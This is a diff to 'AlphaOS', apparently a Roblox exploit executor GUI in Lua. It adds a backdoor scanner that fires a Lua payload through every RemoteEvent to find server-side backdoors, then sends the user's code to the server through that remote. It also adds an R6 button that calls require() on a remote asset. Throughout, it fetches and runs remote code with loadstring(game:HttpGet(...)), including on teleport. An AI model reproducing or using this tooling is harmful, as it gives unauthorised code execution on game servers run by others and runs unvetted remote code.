@@ -29,6 +29,10 @@ if not isfile("AlphaOS/Assets/Pin.png") then
 	writefile("AlphaOS/Assets/Pin.png", game:HttpGet("https://i.ibb.co/Wp9HrZD/Pin-Button.png"))
 end
 
+if not isfile("AlphaOS/Assets/Inject.png") then
+	writefile("AlphaOS/Assets/Inject.png", game:HttpGet("https://i.ibb.co/jDBH1by/Inject.png"))
+end
+
 if not isfolder("AlphaOS/Tabs") then
 	makefolder("AlphaOS/Tabs")
 end
@@ -68,21 +72,11 @@ local SavedScript = readfile("AlphaOS/Tabs/Script1.lua")
 BnM = loadstring(game:HttpGet("https://raw.githubusercontent.com/saxophonebug/rblxtst/main/BnM"))()
 
 if CustomUI then
-    	CustomUIText = [[getgenv().CustomUI = {
-		["Rounded"] = ]] .. tostring(CustomUI["Rounded"]) .. [[,
-		["Colors"] = {
-			["Background Color"] = Color3.new(]] .. tostring(CustomUI["Colors"]["Background Color"]) .. [[),
-			["Foreground Color"] = Color3.new(]] .. tostring(CustomUI["Colors"]["Foreground Color"]) .. [[),
-			["Background Tint Color"] = Color3.new(]] .. tostring(CustomUI["Colors"]["Background Tint Color"]) .. [[),
-			["TextBox Color"] = Color3.new(]] .. tostring(CustomUI["Colors"]["TextBox Color"]) .. [[),
-			["Line Number Color"] = Color3.new(]] .. tostring(CustomUI["Colors"]["Line Number Color"]) ..[[),
-			["Pinned Color"] = Color3.new(]] ..  tostring(CustomUI["Colors"]["Pinned Color"]) .. [[),
-			["Unpinned Color"] = Color3.new(]] .. tostring(CustomUI["Colors"]["Unpinned Color"]) .. [[)
-		}
-	}]]
-
-
-	queue_on_teleport('getgenv().nl = true ' .. CustomUIText .. 'loadstring(game:HttpGet("https://raw.githubusercontent.com/saxophonebug/rblxtst/main/AIE"))()')
+	function setab(val, name, skipnewlines, depth) 
+	   skipnewlines = skipnewlines or false depth = depth or 0 local tmp = string.rep(" ", depth) if name then tmp = tmp .. name .. " = " end if type(val) == "table" then tmp = tmp .. "{" .. (not skipnewlines and "\n" or "") for k, v in pairs(val) do tmp =  tmp .. setab(v, k, skipnewlines, depth + 1) .. "," .. (not skipnewlines and "\n" or "") end tmp = tmp .. string.rep(" ", depth) .. "}" elseif type(val) == "number" then tmp = tmp .. tostring(val) elseif type(val) == "string" then tmp = tmp .. string.format("%q", val) elseif type(val) == "boolean" then tmp = tmp .. (val and "true" or "false") elseif type(val) == "function" then tmp = tmp  .. "func: " .. debug.getinfo(val).name else tmp = tmp .. tostring(val) end return tmp
+	end  
+	
+	queue_on_teleport('getgenv().nl = true getgenv().CustomUI = ' .. setab(CustomUI) .. 'loadstring(game:HttpGet("https://raw.githubusercontent.com/saxophonebug/rblxtst/main/AIE"))()')
 else
 	queue_on_teleport('getgenv().nl = true loadstring(game:HttpGet("https://raw.githubusercontent.com/saxophonebug/rblxtst/main/AIE"))()')
 end
@@ -119,13 +113,13 @@ BlurFX.Parent = game.Lighting
 game:GetService('StarterGui'):SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false)
 game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false)
 
-local BackgroundColor = CustomUI["Colors"]["Background Color"] or Color3.fromRGB(9, 11, 16)
-local ForegroundColor = CustomUI["Colors"]["Foreground Color"] or Color3.fromRGB(143, 147, 162)
-local BackgroundTintColor = CustomUI["Colors"]["Background Tint Color"] or Color3.fromRGB(20, 20, 20)
-local TextBoxColor = CustomUI["Colors"]["TextBox Color"] or Color3.fromRGB(15, 17, 26)
-local LineNumberColor = CustomUI["Colors"]["Line Number Color"] or Color3.fromRGB(17, 32, 47)
-local PinPinnedColor = CustomUI["Colors"]["Pinned Color"] or Color3.fromRGB(3, 60, 166)
-local PinUnPinnedColor = CustomUI["Colors"]["Unpinned Color"] or Color3.fromRGB(88, 88, 88) 
+local BackgroundColor = CustomUI.Colors.BackgroundColor or Color3.fromRGB(9, 11, 16)
+local ForegroundColor = CustomUI.Colors.ForegroundColor or Color3.fromRGB(143, 147, 162)
+local BackgroundTintColor = CustomUI.Colors.BackgroundTintColor or Color3.fromRGB(20, 20, 20)
+local TextBoxColor = CustomUI.Colors.TextBoxColor or Color3.fromRGB(15, 17, 26)
+local LineNumberColor = CustomUI.Colors.LineNumberColor or Color3.fromRGB(17, 32, 47)
+local PinPinnedColor = CustomUI.Colors.PinnedColor or Color3.fromRGB(3, 60, 166)
+local PinUnPinnedColor = CustomUI.Colors.UnpinnedColor or Color3.fromRGB(88, 88, 88) 
 
 local RoundedCorners = CustomUI["Rounded"] or false
 
@@ -152,6 +146,8 @@ local ExecuterScroll = Instance.new("ScrollingFrame")
 
 local ExecuterPinned = false
 local ExecuterPin = Instance.new("ImageButton")
+
+local InjectButton = Instance.new("ImageButton")
 
 local ScriptsScroll = Instance.new("ScrollingFrame")
 local ScriptsLayout = Instance.new("UIListLayout")
@@ -235,6 +231,7 @@ local ExecuterClearBtn = Instance.new("TextButton")
 local ExecuterOpenFileBtn = Instance.new("TextButton")
 local ExecuterSaveFileBtn = Instance.new("TextButton")
 local ExecuterBeautifyBtn = Instance.new("TextButton")
+local R6Btn = Instance.new("TextButton")
 
 local ToolsClearBtn = Instance.new("TextButton")
 local ToolsToggleRspy = Instance.new("TextButton")
@@ -244,6 +241,7 @@ local ToolsStopBtn = Instance.new("TextButton")
 local ToolsChangeBtn = Instance.new("TextButton")
 local ToolsSetBtn = Instance.new("TextButton")
 local ToolsTeleBtn = Instance.new("TextButton")
+
 --[[ TEXTBOXS ]]--
 
 local ExecuterBox = Instance.new("TextBox")
@@ -987,6 +985,116 @@ ExecuterPin.MouseButton1Down:connect(function()
 	end
 end)
 
+--credits to backdoor.exe for backdoor with remotes.
+
+InjectButton.Parent = Executer
+InjectButton.Active = true
+InjectButton.Position = UDim2.new(0.9, 0, 0.025, 0)
+InjectButton.Size = UDim2.new(0, 20, 0, 20)
+InjectButton.Image = getcustomasset("AlphaOS/Assets/Inject.png")
+InjectButton.BackgroundTransparency = 1
+InjectButton.ZIndex = 14
+InjectButton.ImageColor3 = PinUnPinnedColor
+
+function Notify(title, text)
+	game:GetService("StarterGui"):SetCore("SendNotification", {Title = title, Text = text})
+end
+
+checkDebounce = true
+function Attached()
+	if workspace:FindFirstChild(valueName) then
+		game.workspace:WaitForChild(valueName):Destroy()
+	end
+	Notify('Server Side','Attached')
+	R6Btn.Visible = true
+	InjectButton.ImageColor3 = PinPinnedColor
+	found = true
+end
+
+cachEnabled = false
+found = false
+
+valueName = "apples" ..game.Players.LocalPlayer.Name..string.char(math.random(65, 90))..string.char(math.random(65, 90))..math.random(100000, 999999)
+
+function check()
+	if workspace:FindFirstChild(valueName) then
+		remote = sti(workspace:FindFirstChild(valueName).Value)
+		return true
+	end
+end
+
+function sti(str)
+	local dir = str
+	local segments = dir:split(".")
+	local current = game
+	for i, v in pairs(segments) do
+		current = current[v]
+	end
+	return current
+end
+
+function scan()
+	found = false
+	scanDebounce = false
+	for _, rm in pairs(game:GetDescendants()) do
+		if rm.ClassName == "RemoteEvent" and not found then
+			rm:FireServer("a = Instance.new('StringValue',workspace) a.Name = '" ..valueName .. "' a.Value = '" .. rm:GetFullName() .. "'")
+			game:GetService("RunService").Stepped:Wait()
+			if check() then
+				Attached()
+				backdoor = remote:GetFullName()
+				break
+			end
+		end
+	end
+	if not found then
+		wait(1.5)
+		if check() then
+			Attached()
+			backdoor = remote:GetFullName()
+		end
+	end
+	if not found then
+		Notify("Server Side","Status: failed to find a backdoor")
+	end
+	wait(0.01)
+	scanDebounce = true
+end
+
+Adebounce = true
+InjectButton.MouseButton1Click:Connect(
+	function()
+		if not found then
+			if Adebounce then
+				Adebounce = false
+				for _, cach in pairs(game:GetDescendants()) do
+					if cach.ClassName == "StringValue" and cach.Name == "cached remote" then
+						local backdoor = cach.Parent:GetFullName()
+						remote = cach.Parent
+						Attached()
+						cached = true
+						Adebounce = true
+						break
+					end
+				end
+				if game.ReplicatedStorage:FindFirstChild("Chat") then
+					qrm = game.ReplicatedStorage:FindFirstChild("Chat")
+					qrm:FireServer(Script)
+					wait(0.15)
+					if check(qrm) then
+						Attached()
+					end
+					rsc = true
+				end
+				if not cached and not rsc then
+					scan()
+					Adebounce = true
+				end
+			end
+		end
+	end
+)
+
 ExecuterTitle.Name = "ExecuterTitle"
 ExecuterTitle.Parent = Executer
 ExecuterTitle.ZIndex = 13
@@ -1512,16 +1620,19 @@ ExecuterBtn.TextColor3 =  ForegroundColor
 ExecuterBtn.TextSize = 25
 
 ExecuterBtn.MouseButton1Down:connect(function() 
-	
-	local result, err = loadstring(ExecuterBox.Text)
-	
-	if type(result) ~= "function" then
+	if not found then
+		local result, err = loadstring(ExecuterBox.Text)
 		
-		print(err)
-		
-	else
-		
-		result()
+		if type(result) ~= "function" then
+			
+			print(err)
+			
+		else
+			
+			result()
+		end
+	elseif found then
+		remote:FireServer(ExecuterBox.Text)
 	end
 end)
 
@@ -1584,6 +1695,25 @@ ExecuterBeautifyBtn.TextSize = 25
 
 ExecuterBeautifyBtn.MouseButton1Down:connect(function() 
 	ExecuterBox.Text = BnM.Beautify(ExecuterBox.Text)
+end)
+
+R6Btn.Name = "R6Btn"
+R6Btn.Parent = Executer
+R6Btn.ZIndex = 13
+R6Btn.BackgroundColor3 = BackgroundColor
+R6Btn.BorderColor3 = BackgroundColor
+R6Btn.Position = UDim2.new(0.85, 0, 0.91, 0)
+R6Btn.Size = UDim2.new(0, 111, 0, 32)
+R6Btn.Font = Enum.Font.SourceSans
+R6Btn.Text = "R6"
+R6Btn.TextColor3 = ForegroundColor
+R6Btn.TextSize = 22
+R6Btn.Visible = false
+
+R6Btn.MouseButton1Click:Connect(function()
+	if found then
+		remote:FireServer('require(3041175937):r6("' .. game.Players.LocalPlayer.Name .. '")')
+	end
 end)
 
 --[[ ALPHA INSIDE EXECUTER CONSOLE ]]--
@@ -2570,6 +2700,7 @@ Mouse.KeyDown:Connect(function(key)
 		ToolsPin.Visible = true
 		ConsolePin.Visible = true
 		FilesPin.Visible = true
+		InjectButton.Visible = true
 		
 		BackgroundMusic.Volume = MusicVolume
 		
@@ -2606,6 +2737,7 @@ Mouse.KeyDown:Connect(function(key)
 		ToolsPin.Visible = false
 		ConsolePin.Visible = false
 		FilesPin.Visible = false
+		InjectButton.Visible = false
 		
 		BackgroundMusic.Volume = 1
 		
